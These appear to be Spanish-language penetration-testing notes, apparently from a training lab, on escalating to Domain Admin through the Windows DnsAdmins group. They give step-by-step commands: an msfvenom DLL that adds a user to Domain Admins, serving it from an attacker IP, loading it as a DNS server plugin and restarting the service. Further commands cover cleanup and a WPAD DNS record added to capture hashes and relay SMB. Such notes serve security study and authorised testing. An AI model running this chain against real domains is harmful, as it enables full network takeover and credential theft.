# üõ°Ô∏è Elevaci√≥n de privilegios v√≠a DnsAdmins en Windows

## üß† ¬øQu√© es DnsAdmins?

El grupo **DnsAdmins** permite administrar el servicio DNS en un entorno Windows. Este servicio corre como **NT AUTHORITY\SYSTEM**, por lo que **miembros de este grupo pueden escalar privilegios** si el servidor DNS est√° mal configurado.

---

## üöÄ Vector de ataque

### 1. Crear una DLL maliciosa
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### 2. Servir la DLL con HTTP
```bash
python3 -m http.server 7777
```

### 3. Descargar la DLL en el servidor DNS
```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

### 4. Establecer la DLL como plugin del servicio DNS
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

**IMPORTANTE:** PONER LA RUTA ABSOLUTA AL adduser.dll

### 5. Verificar pertenencia al grupo DnsAdmins
```powershell
Get-ADGroupMember -Identity DnsAdmins
```

---

## üîÑ Reinicio del servicio DNS

### Obtener el SID del usuario

First, we need our user's SID.

```cmd
wmic useraccount where name="netadm" get sid
```

output: 
S-1-5-21-669053619-2741956077-1013132368-1109

```
### Ver permisos del servicio DNS

Once we have the user's SID, we can use the¬†`sc`¬†command to check permissions on the service. Per this¬†[article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has¬†`RPWP`¬†permissions which translate to¬†`SERVICE_START`¬†and¬†`SERVICE_STOP`, respectively.

```cmd
sc sdshow DNS
```

output: 

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)**(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:**(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

En esta entrada vemos que est√° el SID de nuestro usuario:
(A;;RPWP;;;S-1-5-21-...-1109)
Esto significa que:
- `A` ‚Üí Allow (permitir)
    
- `RP` ‚Üí Read Property
    
- `WP` ‚Üí Write Property
    
- `S-1-5-21-...` ‚Üí SID de un usuario

Ese usuario (SID) tiene permisos de lectura y escritura sobre el servicio DNS, y adem√°s coincide que es nuestro SID por lo que nosotros tenemos esos permisos.


```

### Detener y reiniciar DNS (si tienes permisos)
```cmd
sc stop dns
sc start dns
```

---

## üßæ Confirmar ejecuci√≥n

Verifica si el usuario fue a√±adido:
```cmd
net group "Domain Admins" /domain
```
NOTA: Para que se apliquen los cambios hay que iniciar sesi√≥n de nuevo, para deslogear usar `shutdown /l`

---

## üßπ Limpieza

### Ver clave del registro establecida
```cmd
reg query \<IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

### Eliminar clave
```cmd
	reg delete \<IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

### Reiniciar servicio DNS
```cmd
sc start dns
```

---

## üß® Abuso con WPAD

### Desactivar bloque global
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### A√±adir registro WPAD
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

Esto permite hacer ataques de proxy (Responder, Inveigh) para capturar hashes y realizar SMBRelay.

---

## ‚ö†Ô∏è Nota final

Este ataque es **destructivo y peligroso**: modificar el servicio DNS en un controlador de dominio puede romper toda la red. **Solo se debe realizar con permiso expl√≠cito del cliente** y documentar la limpieza post-explotaci√≥n.

